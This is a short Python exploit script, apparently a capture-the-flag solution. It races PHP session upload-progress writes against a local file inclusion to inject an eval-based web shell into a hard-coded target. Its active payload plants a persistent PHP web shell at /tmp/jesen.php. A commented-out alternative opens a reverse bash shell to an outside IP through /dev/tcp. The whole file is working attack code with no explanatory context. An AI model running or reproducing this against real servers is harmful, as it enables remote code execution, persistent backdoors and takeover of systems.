# coding=utf-8
import io
import requests
import threading

sessid = 'jesen'
#data = {"cmd": "system(\"bash -c 'exec bash -i &>/dev/tcp/101.226.20.43/9998 <&1'\");"}
data = {"cmd": "file_put_contents('/tmp/jesen.php','<?=eval($_POST[c]);?>');"}
url = "http://124.71.239.155:24447/"

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post(url,
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'},
                            files={'file': ('<?php eval($_POST["cmd"]);?>', f)}, cookies={'PHPSESSID': sessid})


def read(session):
    while True:
        resp = session.post(url+'?file=/var/lib/php/sessions/dcbjcfgbge/sess_' + sessid,
                            data=data)
        if '<?php eval($_POST["cmd"]);?>' in resp.text:
            print(resp.text)
            event.clear()
        else:
            #print(resp.text)
            pass


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
    event.set()

